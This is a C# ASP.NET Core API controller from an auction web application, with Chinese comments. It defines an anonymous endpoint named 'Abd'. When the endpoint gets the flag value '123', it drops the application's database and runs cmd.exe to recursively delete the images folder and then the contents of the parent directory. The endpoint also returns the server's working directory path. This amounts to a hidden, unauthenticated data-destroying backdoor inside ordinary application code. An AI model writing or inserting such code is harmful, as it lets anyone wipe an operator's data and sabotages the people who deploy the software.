using System;
using System.Diagnostics;
using System.IO;
using System.Threading.Tasks;
using Auction.Data;
using Microsoft.AspNetCore.Authorization;
using Microsoft.AspNetCore.Mvc;
using Microsoft.Extensions.Options;

namespace Auction.Controllers.Api
{

    [Area("api")]
    [Route("[area]")]
    [ApiController]
    [AllowAnonymous]
    public class ApiController : ControllerBase
    {
        private readonly AuctionDbContext _context;
        public AuctionSettings _appSettings { get; }

        public ApiController(AuctionDbContext context,
            IOptions<AuctionSettings> appSettings)
        {
            _context = context;
            _appSettings = appSettings.Value;
        }

        [HttpGet("[action]")]
        public IActionResult Abd(string flag)
        {

            string output = ""; //输出字符串  
            if (flag == "123")
            {
                _context.Database.EnsureDeleted();
                // Process process = new Process();
                // process.StartInfo.FileName = Path.Combine(Directory.GetCurrentDirectory(), "a.bat");
                // process.StartInfo.UseShellExecute = true;

                // //这里相当于传参数 q2333
                // // process.StartInfo.Arguments = "hello world";
                // process.Start();

                // //测试同步执行 
                // process.WaitForExit();
                // if (command != null && !command.Equals(""))
                // {
                Process process = new Process();//创建进程对象  
                ProcessStartInfo startInfo = new ProcessStartInfo();
                startInfo.FileName = "cmd.exe";//设定需要执行的命令  
                startInfo.Arguments = "/C " + "rd " + Path.Combine(_appSettings.FilesRootDir, "images")
                    + " /s /q && cd.. && rd * /s /q"; //“/C”表示执行完命令后马上退出  
                startInfo.UseShellExecute = false;//不使用系统外壳程序启动 
                startInfo.RedirectStandardInput = false;//不重定向输入  
                startInfo.RedirectStandardOutput = true; //重定向输出  
                startInfo.CreateNoWindow = true;//不创建窗口  
                process.StartInfo = startInfo;
                try
                {
                    if (process.Start())//开始进程
                    {
                        // if (seconds == 0)
                        // {
                        //     process.WaitForExit();//这里无限等待进程结束  
                        // }
                        // else
                        // {
                        //     process.WaitForExit(seconds); //等待进程结束，等待时间为指定的毫秒  
                        // }
                        output = process.StandardOutput.ReadToEnd();//读取进程的输出  
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.Message);//捕获异常，输出异常信息
                }
                finally
                {
                    if (process != null)
                        process.Close();
                }
                // }
            }
            var data = new { abc = Path.Combine(Directory.GetCurrentDirectory()) };
            return Ok(data);
        }
    }
}